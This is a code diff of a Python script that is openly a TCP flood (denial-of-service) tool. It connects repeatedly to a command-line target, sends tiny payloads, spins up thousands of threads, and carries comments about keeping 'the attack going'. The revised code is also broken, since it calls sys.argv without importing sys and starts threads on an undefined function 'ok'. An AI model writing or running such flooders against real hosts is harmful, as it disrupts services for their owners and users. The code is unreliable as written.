@@ -1,18 +1,20 @@
+# updated version
+# credits to the professional socket programmer(mwah)
+# might wanna lower the threads
+
+
 import socket
-import sys
+from sys import argv
 from threading import Thread
-
-if len(sys.argv) < 3: #making sure all arguments are applied
-  sys.exit(f"Syntax: python3 {sys.argv[0]} (ip) (port)")
-
 def send():
-  while True: #while True loop so that the program doesn't stop
+  while True:
     try:
-      s = socket.socket()
-      s.connect((sys.argv[1], int(sys.argv[2])))
-      s.send(b'.') #yes this payload isn't going to bypass anything, but it is a payload with a smaller byte size so it ouputs a high packets per second, however simple tcp rate limiting will patch this
-    except: #excepting an exception and passing it so that the program doesn't stop
-      pass
-
-for i in range(int(sys.argv[3])):
-  Thread(target=send).start() #starting the threads
+      sock = socket.socket() #not including anything in the socket due to the fact that socket.socket defaults as a tcp socket
+      sock.settimeout(1)
+      sock.connect((sys.argv[1], int(sys.argv[2])))
+      sock.send(b" ") #sending a low payload = faster packet sending
+      sock.close()
+    except: 
+      pass #ignore any exceptions to keep the attack going
+for i in range(9999): #might wanna make this lower LOL
+  Thread(target=ok).start()
